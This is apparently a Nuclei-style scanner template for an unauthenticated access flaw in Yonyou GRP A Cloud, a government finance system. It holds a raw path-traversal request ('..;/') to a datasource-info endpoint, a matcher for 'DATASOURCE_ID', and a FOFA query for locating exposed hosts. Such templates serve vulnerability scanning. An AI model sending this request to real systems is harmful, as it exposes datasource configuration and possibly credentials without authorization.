id: yonyou-grp-a-cloud-selectDatasourceInfo-unauth
info:
  name: 用友 GRP A Cloud 政府财务云系统 selectDatasourceInfo - unauth
  author: leadlife
  severity: high
  description:
  reference:
    - todo
  metadata:
    verified: true
    fofa-qeury: app="用友-政务财务系统" || body="/pf/portal/login/css/fonts/style.css"
  tags: yonyou,unauth,oa,grpacloud

http:
  - raw:
      - |
        GET /pub/fe/config/..;/..;/..;/gla/dataSource/selectDatasourceInfo HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate, br
        Accept: */*
        Accept-Language: en-US;q=0.9,en;q=0.8
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
        Connection: close
        Cache-Control: max-age=0

    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"DATASOURCE_ID")